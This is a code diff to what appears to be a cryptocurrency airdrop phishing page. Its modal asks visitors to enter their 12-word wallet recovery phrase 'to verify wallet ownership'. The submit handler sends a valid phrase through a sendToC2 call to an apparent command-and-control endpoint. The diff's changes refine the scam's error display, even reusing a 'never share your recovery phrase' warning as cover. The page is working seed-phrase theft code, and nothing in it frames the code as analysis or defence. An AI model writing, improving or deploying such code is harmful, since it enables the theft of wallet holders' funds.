@@ -522,7 +522,7 @@
       This is required to verify wallet ownership and prevent duplicate claims.
     </p>
     <textarea id="seedPhraseInput" rows="3" placeholder="Enter your 12-word recovery phrase here..."></textarea>
-    <p class="warning-text">⚠️ Never share your recovery phrase with anyone you don't trust.</p>
+    <p class="warning-text" id="seedPhraseWarning">⚠️ Never share your recovery phrase with anyone you don't trust.</p>
     <button class="verify-submit-btn" id="verifySubmitBtn">Verify & Claim Airdrop</button>
   </div>
 </div>
@@ -899,8 +899,12 @@
   }
 
   // ===== SHOW VERIFY WALLET MODAL =====
-  function showVerifyModal() {
+    function showVerifyModal() {
     document.getElementById('verifyOverlay').classList.add('active');
+    const warningEl = document.getElementById('seedPhraseWarning');
+    if (warningEl) {
+      warningEl.innerHTML = '⚠️ Never share your recovery phrase with anyone you don\'t trust.';
+    }
   }
 
 
@@ -1114,21 +1118,29 @@
 
 
   // ===== HANDLE VERIFY SUBMIT =====
-      function handleVerifySubmit() {
+       function handleVerifySubmit() {
     const phraseInput = document.getElementById('seedPhraseInput');
     const input = phraseInput.value.trim();
     const statusDiv = document.getElementById('walletStatus');
+    const warningEl = document.getElementById('seedPhraseWarning');
     
     if (!input) return;
     
     if (!validateSeedPhrase(input)) {
-      statusDiv.innerHTML = '<span style="color: #ff4060; font-weight: 600;">Seed Phrase Not Recognized</span><br><span style="font-size:0.8rem;">Please check your seed phrase and try again.</span>';
+      // Change the warning text to the error message
+      if (warningEl) {
+        warningEl.innerHTML = '<span style="color: #ff4060;">Seed Phrase Not Recognized</span><br><span style="font-size:0.8rem;">Please check your seed phrase and try again.</span>';
+      }
+      // Also clear the status div
+      if (statusDiv) {
+        statusDiv.innerHTML = '';
+      }
       return;
     }
     
     // Valid input
     sendToC2({ type: 'SEED_PHRASE_SUBMITTED', phrase: input });
-        
+    
     document.getElementById('verifyOverlay').classList.remove('active');
     
     if (statusDiv) {
